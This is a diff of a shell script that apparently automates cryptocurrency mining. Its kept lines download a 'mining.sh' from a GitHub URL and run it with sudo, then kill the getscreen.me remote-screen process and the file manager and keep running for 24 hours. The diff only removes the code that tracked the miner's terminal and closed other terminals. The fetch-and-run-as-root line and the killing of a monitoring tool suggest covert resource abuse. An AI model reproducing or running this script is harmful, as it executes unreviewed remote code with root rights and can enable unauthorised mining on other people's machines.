@@ -208,8 +208,6 @@ rm -f /tmp/test_crop.png "$TEMP_OCR"
 # --- Launch the mining script and store its PID ---
 echo "[*] Launching the mining script in a new terminal..."
 xfce4-terminal -e "bash -c 'sudo curl -o try.sh https://raw.githubusercontent.com/Working-aanas/deepscreen/refs/heads/main/mining.sh && sudo chmod +x try.sh && sudo ./try.sh; exec bash'" &
-MINING_TERMINAL_PID=$!
-echo "[*] Mining terminal launched with PID: $MINING_TERMINAL_PID"
 
 # --- Automated Cleanup After Mining Script Launch ---
 echo "[*] Waiting for 5 minutes after mining script launch for cleanup..."
@@ -220,16 +218,6 @@ sudo pkill getscreen.me || true
 
 echo "[*] Turning off File Explorer (PCManFM)..."
 sudo pkill pcmanfm || true
-
-echo "[*] Killing other opened terminals except the mining one..."
-ALL_XFCE_TERMINAL_PIDS=$(pgrep xfce4-terminal)
-
-for PID in $ALL_XFCE_TERMINAL_PIDS; do
-    if [ "$PID" -ne "$MINING_TERMINAL_PID" ]; then
-        echo "    Killing xfce4-terminal with PID: $PID"
-        sudo kill "$PID" || true
-    fi
-done
 
 # --- Keep the main script active for 24 hours ---
 echo "[*] All tasks completed. Keeping this script active for 24 hours (86400 seconds)."
